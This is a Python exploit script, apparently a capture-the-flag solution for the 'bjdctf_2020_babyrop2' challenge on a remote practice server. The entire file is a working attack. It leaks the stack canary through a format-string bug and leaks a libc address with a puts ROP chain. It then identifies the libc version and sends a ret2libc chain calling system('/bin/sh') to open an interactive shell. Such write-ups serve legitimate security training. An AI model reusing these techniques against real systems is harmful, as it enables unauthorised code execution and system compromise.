from sgtlibc.gamebox import *
import sgtlibc
from argparse import ArgumentError
import random
from typing import Callable
from sgtpyutils.logger import logger

set_config(GameBoxConfig(
    is_local=False,
    file='./bjdctf_2020_babyrop2',
    remote='node4.buuoj.cn:29820',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))


def exp_all(index: int):
    s = sgtlibc.Searcher()
    elf = client.elf

    main_addr = 0x00400887  # elf.symbols['main']

    def leak(func: str):
        payload = payload_exp
        payload += p00(elf.rop['rdi']) + p00(elf.got[func]) + \
            p00(elf.plt['puts']) + p00(main_addr)
        sla(b'u story!\n', payload)
        data = rc(6).ljust(8, b'\0')
        data = u00(data)
        s.add_condition(func, data)
        print(f'leak {func}:{hex(data)}')

    def exp(data: bytes):
        start_game()
        sla(b'help u!\n', data)
        r = rl()
        return r

    position = formats.exp_get_str_position(exp)
    canary_pos = position + 1
    start_game()
    sla(b'help u!\n', f'%{canary_pos}$p')
    rc(2)  # remove `0x` char
    canary = rl()  # canary is full-8bytes endwith 00
    canary = bytes.fromhex(canary.decode())[::-1]  # little-indian
    log.info(f'canary:{canary.hex()}')
    payload_exp = b'a' * 24 + canary + fakeebp()

    leak('__libc_start_main')

    def libc_filter(x: str):
        return '2.23' in x

    # choose your system index
    data = s.dump(db_index=index, filter=libc_filter)
    system_addr = s.get_address(sgtlibc.s_system)
    binsh_addr = s.get_address(sgtlibc.s_binsh)
    log.info(f'system_addr:{hex(system_addr)}')
    log.info(f'binsh_addr:{hex(binsh_addr)}')

    payload = payload_exp + p00(elf.rop['rdi']) + p00(binsh_addr) + \
        p00(system_addr) + p00(0xdeadbeef)
    sl(payload)
    


for i in range(8):
    try:
        exp_all(i)
        interactive()
    except Exception as e:
        print(e)
        pause()
    
pause()
interactive()
